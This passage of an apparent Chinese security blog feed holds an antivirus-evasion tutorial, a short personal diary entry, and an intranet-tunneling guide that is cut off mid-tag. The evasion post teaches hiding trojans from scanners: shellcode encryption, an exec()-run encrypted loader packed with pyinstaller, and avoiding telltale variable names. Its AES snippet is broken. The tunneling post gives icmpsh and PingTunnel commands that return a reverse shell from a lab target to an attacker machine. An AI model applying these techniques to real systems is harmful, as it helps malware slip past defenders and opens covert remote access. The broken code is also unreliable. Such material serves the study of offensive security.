    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。</p><span id="more"></span><h1 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h1><p>免杀技术全称为反杀毒技术Anti Anti- Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="查杀分类"><a href="#查杀分类" class="headerlink" title="查杀分类"></a>查杀分类</h3><ul><li>静态免杀：一般根据特征码识别，然后对文件进行特征匹配。</li><li>行为查杀（动态查杀）：主要是对其产生的行为进行特征匹配。</li><li>云查杀：提取出文件的特征和上传云端，云端进行检测后返回客户端，对相应病毒进行查杀。</li></ul><p><strong>静态免杀</strong><br>对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。</p><p>杀毒是提取文件一段“特征码”来识别病毒文件。<br>特征码：能识别一个程序是一个病毒的一段不大于 64 字节的特征串</p><p>那杀毒软件是怎么提取文件特征码的？<br>如果我们知道了一个文件是病毒，那么通过 md5 肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接 md5 肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做“模糊哈希”（Fuzzy Hashing）算法的东西。<br>模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。</p><p>大致就可以理解为，不要把一个文件的所有内容都拿来计算 hash，而通过分片，取出部分重要（不易改变）的内容进行 hash 计算，这样就能达到通过一个特征码找到类似的病毒变种。</p><p>特征码定位工具：原理就是分割文件，某些分割部分填入数据 (0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之间区别是使用的分割算法不同，查找特征码的效果不同。</p><p>目前比较常有名气的特征码定位器主要有 CCL 与 MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p><h3 id="免杀分类"><a href="#免杀分类" class="headerlink" title="免杀分类"></a>免杀分类</h3><ul><li>开源免杀：指的是拥有病毒、木马原始码的前提下，通过修改原始码进行免杀。</li><li>手工免杀：指的是仅有病毒、木马的可执行文件（PE文件）的情况下进行免杀。</li><li>自动免杀：指的是病毒、木马自身能自动变异，如：千面人病毒。</li></ul><p><strong>手工免杀(仅限有源码)</strong></p><ol><li>mian 中屏蔽所有代码，编译，扫描。不报的话继续 2，如果依然报毒，去 5。</li><li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复 2。直到定位到某个函数或者多个函数，进入 3。</li><li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复 2。</li><li>直到定位某段代码（无自定义内部调用），特征码在此。</li><li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从 1 开始。如果没有，那去找找 PE 头吧。</li></ol><p>大致流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. sub1 //未报2. sub1 sub2 //未报3. sub1 sub2 sub3 //报4. sub1 sub2 sub3(sub31) //未报5. sub1 sub2 sub3(sub31 sub32) //报6. sub1 sub2 sub3(sub31 sub32(sub321)) //报...直到找到某API调用，或者逻辑代码（没有自定义函数调用）</span><br></pre></td></tr></table></figure><h2 id="技术概览"><a href="#技术概览" class="headerlink" title="技术概览"></a>技术概览</h2><h3 id="加壳脱壳与加密解密"><a href="#加壳脱壳与加密解密" class="headerlink" title="加壳脱壳与加密解密"></a>加壳脱壳与加密解密</h3><ul><li>加壳压缩是一种对EXE档案的数据压缩及加密保护，可以将EXE档案压缩成自我解压档案，并能隐藏解压进程。</li><li>在免杀技术里所谓的壳与伪装壳其实就是压缩与外层数据伪装，其实是利用特殊的算法，对可执行文件与动态库里的资源进行压缩与对文件的描述、版本号、创建日期、修改软件、系统执行需求等外层数据进行伪装。</li><li>脱壳就是把已压缩与伪装的文件完全或近似还原到未压缩与伪装的状态。最常用的加壳软件就是WinRAR。</li><li>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</li><li>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。<br>压缩壳：upx, aspack, fsg, pecompach<br>加密壳：ASProtect, Armadillo(穿山甲), EXEcryptor, Themida, ZProtect<br>虚拟机壳：VMProtect</li></ul><h3 id="加花指令与程序入口点修改"><a href="#加花指令与程序入口点修改" class="headerlink" title="加花指令与程序入口点修改"></a>加花指令与程序入口点修改</h3><ul><li>加花指令就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其它常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响程序的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</li><li>程序入口点修改就是改变入口点，通常用到的方法是在入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转代码，跳转到程序执行数据的入口点上，令程序正常运行。</li></ul><h3 id="内存、文件特征码的定位与修改"><a href="#内存、文件特征码的定位与修改" class="headerlink" title="内存、文件特征码的定位与修改"></a>内存、文件特征码的定位与修改</h3><p>众所周知大部分杀毒软件查杀病毒的根据就是对比特征码，而这个过程一般发生在内存与硬盘中。对比硬盘中储存着的文件的特征码，能全面地查杀电脑中的可疑文件；对比在内存中储存着的文件的特征码，能快速地查杀正在运行的程序是否带有病毒，另外病毒文件一旦进入内存即运行中，很可能会现出原形被杀毒软件查杀。针对杀毒软件这一特性，骇客们发明了内存、文件特征码修改免杀法。通常首先用特征码定位软件定位文件特征码的所在之处，再用UltraEdit对被定位的特征码段进行修改。</p><p>一般修改方法有：</p><ul><li>十六进制的特征码直接修改法，就是把十六进制的特征码加1；</li><li>字符串大小写修改法，就是特征码所对应的内容是字符串的时候，把大小字互换；</li><li>等价替换法，就是当特征码所对应的是汇编指令时，把指令替换成功能类拟的指令；</li><li>指令顺序调换法，把特征码对应的汇编指令的顺序互换；</li><li>通用跳转法，用跳转的方法把特征码对应的汇编指令跳转走，犹如加花一样。</li></ul><p>修改特征码的方法针对性很强很有用，但一次修改只能对一款杀毒软件免杀；要令另一款软件免杀，就要重新针对该软件修改特征码，因为各家杀毒软件公司使用的特征码基本上都不相同。</p><h2 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h2><p>常用工具有：</p><ul><li>加壳器：PEditor、MaskPE、UPX等</li><li>脱壳与分析器：PEid、ResScope、RL!dePacker、Restorator等</li><li>加花器：FakeNinja</li><li>特征码定位与修改器:CCL、OllyDbg、UltraEdit、MYCCL</li><li>调试器：SoftIce</li><li>反汇编器：IDA、W32Dasm等</li><li>十六进制编辑器：HIEW、UltraEdit等</li><li>开 发包：SDK与DDK</li><li>编译器：Microsoft Visual C++、Borland C++、Watcom C、GNU C以及Free Pascal等</li></ul><h2 id="常用沙箱和免杀工具"><a href="#常用沙箱和免杀工具" class="headerlink" title="常用沙箱和免杀工具"></a>常用沙箱和免杀工具</h2><p><a href="https://s.threatbook.com/">微步云沙箱</a><br><a href="https://www.virustotal.com/gui/home/upload">Virustotal</a><br><a href="https://habo.qq.com/">腾讯哈勃分析系统</a><br><a href="https://sandbox.ti.qianxin.com/sandbox/page">奇安信情报沙箱</a></p><p><a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/introduction/sandboxing.html">Cuckoo Sandbox本地沙箱</a><br><a href="https://www.clamav.net/">ClamAV-Linux下杀毒软件</a><br><a href="https://github.com/1y0n/AV_Evasion_Tool">掩日 - 适用于红队的综合免杀工具</a></p><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a>免杀方法</h2><ol><li>对shellcode进行加密处理，如异或、转置、AES加密、Base64加密、多轮加密等。</li><li>对加载器代码进行加密或编码处理，使其静态特征不明显。</li><li>分离免杀，将shellcode和加载器代码放置于网络上，通过下载的方式进行加载，可进一步免除静态特征。</li><li>通过进程注入或借助傀儡进程进行加载和运行。</li><li>通过加壳的方式对木马进行混淆，进而绕过杀软。<br>（通过静态特征绕过杀软检测相对容易，但是要绕过沙箱或动态检测，则非常难）</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="加密shellcode"><a href="#加密shellcode" class="headerlink" title="加密shellcode"></a>加密shellcode</h3><ol><li><p>异或加密<br>异或加密是简单的加密方式，异或运算根据二进制位进行按位运算，如果对应位相同，则为0，不同则为1。同时遵守以下规则：<br>如果a^b&#x3D;c，则可以将b视为密钥，c视为加密字符串，则b^c&#x3D;a，可根据密钥b和密文c，解密出a的值。</p></li><li><p>字符串反转<br>在python中，对一个字符串进行反转，使用 <code>str[::-1]</code> 即可。<br>如果 str&#x3D;’abcde’, str[::-1]&#x3D;’edcba’</p></li><li><p>将字节类型转换为字符串<br>由于python的shellcode为 <code>b&#39;&#39;</code> 的字节类型（也可视为二进制类型），而要进行加密或反转处理，只能针对字符串进行处理，所以还需要对将字节类型数据转换为字符串。可以利用python内置的binascii模块进行处理。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\xfc\xe8\x8f\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span></span><br><span class="line"><span class="built_in">str</span> = binascii.b2a_hex(buf).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure></li><li><p>Python中实现AES加解密<br>加密过程：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装第三方库 pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line">source = <span class="string">&#x27;hello-abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果source不足16位的倍数就用\0补足为16位</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">add = <span class="number">16</span> - (<span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">add = <span class="number">0</span></span><br><span class="line">source = source + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line"><span class="built_in">print</span>(source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义密钥和偏移量，必须是16个字节、24个字节或32个字节</span></span><br><span class="line"><span class="comment"># key = &#x27;todayiswonderful-1234567&#x27;.encode()</span></span><br><span class="line">key = <span class="string">&#x27;todayiswonderful-FEDCBA987654321&#x27;</span>.encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = <span class="string">b&#x27;1234567890ABCDEF&#x27;</span></span><br><span class="line">cryptos = AES.new(key,mode,iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行加密处理</span></span><br><span class="line">cipher = cryptos.encrytpt(source.encode())</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 便于传播可以将其转换成16进制，结果为db86ba246ebdf73c8a3a8b26a98ecadf</span></span><br><span class="line"><span class="built_in">print</span>(b2a_hex(cipher).encode)</span><br></pre></td></tr></table></figure></li></ol><p>解密过程与加密过程相反即可</p><h3 id="加密加载器"><a href="#加密加载器" class="headerlink" title="加密加载器"></a>加密加载器</h3><ol><li><p>将加载器代码进行base64编码</p></li><li><p>将base64编码进行AES加密</p></li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>将加密后的shellcode和加载器放在同一个python文件里。<br>然后使用 <code>exec()</code> 函数执行加载器代码。</p><p>最后使用 <code>pyinstaller.exe</code> 将python文件打包为exe文件，执行命令为：<br><code>pythoninstaller.exe -Fw shellcode_run.py</code></p><p>注意：不能将变量命名为诸如shellcode, trojan, virus等敏感字词。以免被杀毒软件查杀。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.wangan.com/p/7fy7f690c41538bf">免杀技术有一套</a><br><a href="https://bbs.huaweicloud.com/blogs/396696">免杀基础原理及实践免杀</a><br><a href="https://github.com/TideSec/BypassAntiVirus">远控免杀专题</a><br><a href="https://cloud.tencent.com/developer/article/2207475">MSF CS通用免杀项目</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>而立</title>
    <link href="http://example.com/2023/08/30/Diary_20230830/"/>
    <id>http://example.com/2023/08/30/Diary_20230830/</id>
    <published>2023-08-29T16:00:00.000Z</published>
    <updated>2023-08-30T16:14:27.620Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为赶时间，就简单写写。</p><span id="more"></span><h1 id="包容度"><a href="#包容度" class="headerlink" title="包容度"></a>包容度</h1><p>大约有10天没写日记了，还是有点久了，一部分原因是我觉得没什么好写的，如果只是说几句话就算完了，有些空荡。另一部分是我懒，还记得自己说要强迫自己每天写日记，看来是没做到呢。</p><p>接下来便是我想谈的正题，由于各方面的原因，或许也可称为感悟之类的，突然在某一天，感觉自己的包容度上升了。<br>之前是怎样的呢？比如在某个地方见到有人回我评论是带有恶意的方式，我会回骂一句或直接拉黑，当然有时也只是不予理睬。<br>说这个不是想表明自己有多么嫉恶如仇，而是我常常带有一种蔑视的心理：如果某个人在某一方面的认知显得愚蠢，那么我就认为这不是值得对等交谈的人，而不屑与之相处。</p><p>但是近来，由于各种各样的原因，我渐渐能包容这些了。<br>即便有人发评论侮辱，我也能变得波澜不惊，更不会拉黑（顺带一提，我的b站黑名单已经满了）。</p><p>这么做，容易被人视为懦弱吧。</p><p>不过，这不是懦弱胆怯，这是一种包容。<br>既接受人的光辉一面，也容纳人的丑恶一面。<br>说着说着，有种“圣母”的感觉了。哈哈。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>写得不行，没把想表达的内容写出来，有些可惜。等下次有了充裕的时间再做表述吧。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为赶时间，就简单写写。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之隧道通信</title>
    <link href="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</id>
    <published>2023-08-28T16:00:00.000Z</published>
    <updated>2023-08-30T08:11:50.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习+学习。</p><span id="more"></span><h1 id="隐藏通信隧道基础知识"><a href="#隐藏通信隧道基础知识" class="headerlink" title="隐藏通信隧道基础知识"></a>隐藏通信隧道基础知识</h1><h2 id="隐藏通信隧道概述"><a href="#隐藏通信隧道概述" class="headerlink" title="隐藏通信隧道概述"></a>隐藏通信隧道概述</h2><p>一般的网络通信，先在两台机器之间建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下，可以直接发送报文；如果不知道IP地址，就需要将域名解析成IP地址。在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断。</p><p>这里的隧道，是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p><p>常用隧道列举如下：</p><ul><li>网络层：ipv6隧道、ICMP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><h2 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h2><p>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议(TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、 443、53、110、123等。常用的内网连通性判断方法如下：</p><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">命令如下：</span><br><span class="line">ping &lt;IP地址和域名&gt;</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">Pinging www.xxx.com [198.18.0.106] with 32 bytes of data:</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line">Ping statistics for 198.18.0.106:</span><br><span class="line">    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip times in milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>netcat （简称nc）被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。<br>使用nc工具，执行命令：<br><code>nc &lt;IP port&gt;</code><br>开启phpstudy前后：<br><img src="/simg/tunnel_1.png" alt=" "></p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>curl是一个利用URL规则在命令行下工作的综合文件传输工具，支持文件的上传和下载。curl命令不仅支持HTTP、HTTPS、FTP等众多协议，还支持POST、Cookie、 认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux 操作系统自带curl命令。在Windows操作系统中，需要下载并安装curl 命令。</p><p><code>curl &lt;ip:port&gt;</code></p><p>如果远程主机开启了相应的端口，会输出相应的端口信息。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p><h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>在进行DNS连通性检测时，常用的命令为nslookup和dig。</p><p>nslookup是Windows操作系统自带的DNS探测命令，其用法如下所示。在没有指定vps-ip时，nslookup会从系统网络的TCP&#x2F;IP属性中读取DNS服务器的地址。</p><p><code>nslookup www.xxx.com vps-ip</code></p><p>dig是Linux 默认自带的DNS探测命令，其用法如下所示。<br>在没有指定vps-ip时，dig 会到 <code>/etc/resolv.conf</code> 文件中读取系统配置的DNS服务器的地址。如果vps-ip 为192.168.43.1, 将解析xxx的IP地址，说明目前DNS协议是连通的。<br><code>dig @vps-ip www.xxx.com</code></p><p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下：</p><ul><li>查看网络连接，判断是否存在与其他机器的8080 (不绝对)等端口的连接(可以尝试运行 <code>ping -n 1 -a ip</code> 命令)。</li><li>查看内网中是否有主机名类似于“proxy” 的机器。</li><li>查看IE浏览器的直接代理。</li><li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。</li><li>执行如下命令，利用curl工具进行确认。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.xxx.com  //不通</span><br><span class="line">curl -X proxy-ip:port www.xxx.com  //不通</span><br></pre></td></tr></table></figure></li></ul><h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="ipv6隧道技术简介"><a href="#ipv6隧道技术简介" class="headerlink" title="ipv6隧道技术简介"></a>ipv6隧道技术简介</h3><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4中传递IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，使IPv6报文能够穿过IPv4，到达另一个IPv6程序。</p><p>因为现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。</p><p><img src="/simg/tunnel_2.png" alt=" "></p><p>有一点需要指出：即使设备支持IPv6，也可能无法正确分析封装了IPv6 报文的IPv4数据包。配置隧道和自动隧道的主要区别是：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时，如果采用的是自动隧道方法，就不需要进行配置。</p><p>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或他IPv4的配置机制。</p><p>支持IPv6的隧道工具有socat、6tunnel 、nt6tunnel 等。</p><h3 id="防御IPv6隧道攻击的方法"><a href="#防御IPv6隧道攻击的方法" class="headerlink" title="防御IPv6隧道攻击的方法"></a>防御IPv6隧道攻击的方法</h3><p>针对IPv6隧道攻击，最好的防御方法是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。</p><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用，是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相对应的回复与请求。</p><p>在一些网络环境中，如果攻击者使用各类上层隧道(例如HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP&#x2F;UDP数据封装到ICMP的ping数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping数据包)，实现不受限制的网络访问。</p><p>常用的ICMP隧道工具有icmpsh、PingTunnel 、icmptunnel、 powershell icmp等。</p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh工具使用简单，便于“携带”(跨平台),运行时不需要管理员权限。使用git clone命令下载icmpsh。<br><code>git clone https://github.com/inquisb/icmpsh.git</code></p><p>安装Python的impacket类库，以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。<br><code>pip install impacket</code></p><p>因为icmpsh工具要代替系统本身的ping命令的应答程序，输入如下命令来关闭本地系统的ICMP应答( 如果要恢复系统应答，则设置为0)，否则Shell的运行会不稳定(表现为一直刷屏，无法进行交互输入)。<br><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p><p>直接输入“.&#x2F;run.sh” 会抱错，输入如下命令运行工具：<br><code>python2 icmpsh_m.py 【kali主机地址】 【windows主机地址】 # 运行工具</code></p><p>查看kali攻击者IP地址(192.168.220.165)。然后输入如下命令。<br><code>icmpsh.exe -t 【kali主机地址】</code></p><p>在目标主机上运行以上命令后，即可在VPS中看到反弹的shell</p><h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a>PingTunnel</h3><p>PingTunnel也是一款常用的ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(windows7)：192.168.52.133</li></ul><p>首先，在需要建立ICMP隧道的两台机器(kali和Web服务器)上安装PingTunnel工具。 然后，输入如下命令，解压压缩文件，进行配置和编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>但在安装前需要安装它的运行环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装libpcap的依赖环境</span></span><br><span class="line">apt-get install byacc</span><br><span class="line">apt-get install flex bison</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>使用方法：<br>在Web服务器192.168.220.145中输入如下命令，运行PingTunnel 工具,开启隧道。<br><code>ptunnel -x password</code></p><p>在kali机器192.168.220.165中执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.220.145 -lp 2333 -da 192.168.52.133 -dp 80 -x password</span><br><span class="line"></span><br><span class="line">-p   <span class="comment"># 指定ICMP隧道另一端的IP</span></span><br><span class="line">-lp  <span class="comment"># 指定本地监听的TCP端口</span></span><br><span class="line">-da  <span class="comment"># 指定要转发的目标机器的IP</span></span><br><span class="line">-dp  <span class="comment"># 指定要转发的目标机器的TCP端口</span></span><br><span class="line">-x   <span class="comment"># 指定连接密码</span></span><br></pre></td></tr></table></figure><p>上述命令的含义是：<br>在访问攻击者kali(192.168.220.165)的2333端口时，会把数据库服务器192.168.52.133的80端口的数据封装在ICMP隧道里，以Web服务器192.168.220.145为ICMP隧道跳板进行传送。</p><p><img src="/simg/tunnel_3.png" alt=" "></p><p>可以看到服务标识是windows7<br>如果内网机器是linux的可以连接22端口，如果是windows可以尝试3389端口</p><p><code>ptunnel -p 192.168.200.34 -lp 2333 -da 192.168.100.7 -dp 22 -x password</code></p><h3 id="防御ICMP隧道攻击的方法"><a href="#防御ICMP隧道攻击的方法" class="headerlink" 